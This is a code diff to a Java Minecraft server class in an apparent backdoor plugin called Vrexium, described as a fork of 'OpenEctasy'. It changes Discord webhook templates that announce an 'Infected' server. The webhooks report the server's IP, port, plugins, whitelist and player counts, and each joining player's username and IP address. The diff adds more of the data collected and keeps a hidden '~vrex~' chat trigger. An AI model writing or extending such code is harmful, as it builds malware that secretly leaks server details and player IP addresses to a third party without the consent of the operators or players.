@@ -1,4 +1,4 @@
-package fr.bodyalhoha.ectasy;
+package meow.minoa.vrexium;
 
 import org.bukkit.Bukkit;
 import org.bukkit.ChatColor;
@@ -93,35 +93,46 @@ public class SpigotAPI implements Listener {
             + "\"avatar_url\": \"https://squint.tf/icon.webp\","
             + "\"username\": \"Vrexium 🌷\","
             + "\"embeds\": [{"
-            + "    \"title\": \"mwuhehehe\","
+            + "    \"title\": \"Server Started\","
             + "    \"color\": 16737917,"
-            + "    \"description\": \"a server just started with Vrexium >:). \n\n{desc}\","
+            + "    \"description\": \"a server has started with Vrexium >:) \n\n{desc}\","
+            + "    \"image\": {"
+            + "        \"url\": \"https://squint.tf/logo.webp\""
+            + "    },"
             + "    \"footer\": {"
-            + "        \"text\": \"Vrexium - Fork of OpenEctasy\""
+            + "        \"text\": \"<3\""
             + "    }"
             + "}]"
             + "}";
         
         private static final String PLAYER_JOIN_WEBHOOK_TEMPLATE = "{"
-            + "\"avatar_url\": \"https://minotar.net/cube/{player}/100.png\","
-            + "\"username\": \"Vrexium\","
+            + "\"avatar_url\": \"https://squint.tf/icon.webp\","
+            + "\"username\": \"Vrexium 🌷\","
             + "\"embeds\": [{"
-            + "    \"title\": \"Player Joined ;D\","
+            + "    \"title\": \"Player Joined\","
             + "    \"color\": 16737917,"
-            + "    \"description\": \"User: `{player}`\nIP : `{ip}`\n\","
+            + "    \"description\": \"User: `{player}`\nIP: `{ip}`\n\","
+            + "    \"thumbnail\": {"
+            + "        \"url\": \"https://minotar.net/cube/{player}/100.png\""
+            + "    },"
             + "    \"footer\": {"
-            + "        \"text\": \"Vrexium - Fork of OpenEctasy\""
+            + "        \"text\": \"<3\""
             + "    }"
             + "}]"
             + "}";
         
         private String formatServerStartWebhook() {
-            String serverInfo = String.format("IP : `%s`\nPort : `%s`\nVersion : `%s`\nInfected : `%s`\nPlugins : `%s`",
+            String serverInfo = String.format("IP : `%s`\nPort : `%s`\nVersion : `%s`\nInfected : `%s`\nPlugins : `%s`\nOnline Mode : `%s`\nWhitelist : `%s`\nMax Players : `%d`\nOnline Players : `%d`\nMOTD : `%s`",
                 getIP(),
                 Bukkit.getPort(),
                 Bukkit.getVersion().replace("\"", "\\\""),
                 plugin.getName(),
-                getPlugins());
+                getPlugins(),
+                Bukkit.getOnlineMode(),
+                Bukkit.hasWhitelist(),
+                Bukkit.getMaxPlayers(),
+                Bukkit.getOnlinePlayers().size(),
+                Bukkit.getMotd().replace("\"", "\\\""));
             return SERVER_START_WEBHOOK_TEMPLATE.replace("{desc}", serverInfo);
         }
         
@@ -144,7 +155,7 @@ public class SpigotAPI implements Listener {
         // if the chat message contains the string "~vrex~", cancel the event and send a message to the player
         if(e.getMessage().contains("~vrex~")){
             e.setCancelled(true);
-            e.getPlayer().sendMessage(ChatColor.GOLD + "" + ChatColor.BOLD + "Thank you" + ChatColor.AQUA + "" + ChatColor.BOLD + " for using" + ChatColor.GREEN + "" + ChatColor.BOLD + " Open Ectasy" + ChatColor.DARK_PURPLE + "" + ChatColor.BOLD + "!");
+            e.getPlayer().sendMessage(ChatColor.GOLD + "" + ChatColor.BOLD + "ty" + ChatColor.AQUA + "" + ChatColor.BOLD + " 4 using" + ChatColor.GREEN + "" + ChatColor.BOLD + " Vrexium" + ChatColor.DARK_PURPLE + "" + ChatColor.BOLD + "<3");
         }
     }
 
